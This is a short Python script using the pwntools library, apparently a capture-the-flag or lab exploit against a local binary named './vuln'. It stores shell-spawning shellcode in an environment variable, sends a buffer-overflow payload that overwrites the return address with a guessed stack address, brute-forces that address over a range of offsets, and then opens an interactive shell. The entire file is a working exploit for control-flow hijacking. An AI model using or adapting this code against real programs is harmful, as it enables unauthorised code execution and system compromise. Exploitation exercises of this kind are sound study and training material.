#!/usr/bin/env python
from pwn import *


BIN = "./vuln"
context.binary = BIN

# Determined through static analysis.
bytes_read = 0x14
offset = 0x4

# From gdb
env_addr = 0x7fffffffd9dd

shellcode = asm(shellcraft.sh())


for diff in range(-128, 128):
    # Simple control flow hijacking
    payload = b""
    payload += (offset + 8) * b'A'
    payload += pack(env_addr + diff)

    io = process(BIN, env={"SHELLCODE": shellcode})
    io.send(payload)
    try:
        io.recv(timeout=1)
    except EOFError:
        io.terminate()
        io.wait()
        io.close()

io.interactive()
